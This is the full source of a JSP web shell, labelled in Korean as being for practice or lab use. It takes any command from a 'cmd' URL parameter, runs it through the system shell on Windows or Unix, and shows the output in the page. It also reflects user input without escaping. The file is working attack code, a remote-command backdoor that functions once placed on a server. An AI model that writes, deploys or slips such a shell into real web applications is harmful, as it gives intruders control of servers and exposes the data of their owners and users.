<%@ page import="java.io.*" %>
<%@ page contentType="text/html;charset=UTF-8" %>
<html>
<head><title>JSP WebShell - 실습용</title></head>
<body>
<h3>JSP WebShell (실습용)</h3>
<form method="get">
    Command: <input type="text" name="cmd" size="50" value="<%=request.getParameter("cmd")==null?"":request.getParameter("cmd")%>">
    <input type="submit" value="실행">
</form>
<hr>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.trim().isEmpty()) {
        out.println("<b>실행 명령어:</b> " + cmd + "<br><pre>");
        try {
            String[] command;
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                command = new String[]{"cmd.exe", "/c", cmd};
            } else {
                command = new String[]{"/bin/sh", "-c", cmd};
            }
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader errReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line);
            }
            while ((line = errReader.readLine()) != null) {
                out.println("[ERR] " + line);
            }
            process.waitFor();
        } catch (Exception e) {
            out.println("오류: " + e.getMessage());
        }
        out.println("</pre>");
    }
%>
</body>
</html>
